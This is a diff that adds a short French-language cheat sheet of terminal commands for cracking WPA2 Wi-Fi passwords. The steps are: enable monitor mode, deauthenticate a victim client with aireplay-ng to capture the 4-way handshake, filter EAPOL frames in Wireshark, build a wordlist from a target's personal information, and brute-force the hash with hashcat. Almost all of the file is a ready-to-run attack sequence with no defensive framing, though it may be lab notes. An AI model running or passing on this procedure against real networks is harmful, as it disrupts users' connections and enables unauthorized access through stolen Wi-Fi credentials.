@@ -1,0 +1,38 @@
+Nom de l'interface réseau : wlxaca2135e7c0b
+
+Passage Mode monitor
+lsusb
+iw dev
+sudo airmon-ng check kill
+sudo airmon-ng start [interface]
+iw dev
+
+Capture 4 way handshake
+sudo airodump-ng [interface]
+sudo airodump-ng --bssid [MAC PA] --channel [num] [interface]
+(terminal 2) sudo aireplay-ng --deauth 1 -a [MAC PA] -c [MAC VICT] [interface] 
+sudo airodump-ng --bssid [MAC PA] --channel [num] -w handshake [interface]
+
+Analyse paquets
+sudo wireshark
+filtre : eapol
+filtre : wlan.fc.type_subtype == 0x0c
+
+Création wordlist
+python3 fxwordlist.py -m optimized -f Y -c 3 -d 3 -s 3 information.txt --merge ./annees.txt
+wc -l
+
+Brute force du hash
+hcxpcapngtool -o hash.hc22000 handshake.cap
+hashcat -I
+hashcat -d 1 -m 22000 hash.hc22000 wordlist.txt --potfile-disable
+
+Passage mode managed
+sudo ip link set [interface] down
+sudo iw dev [interface] set type managed
+sudo ip link set [interface] up
+sudo systemctl restart avahi-daemon
+sudo systemctl restart NetworkManager
+sudo systemctl restart wpa_supplicant
+
+ 
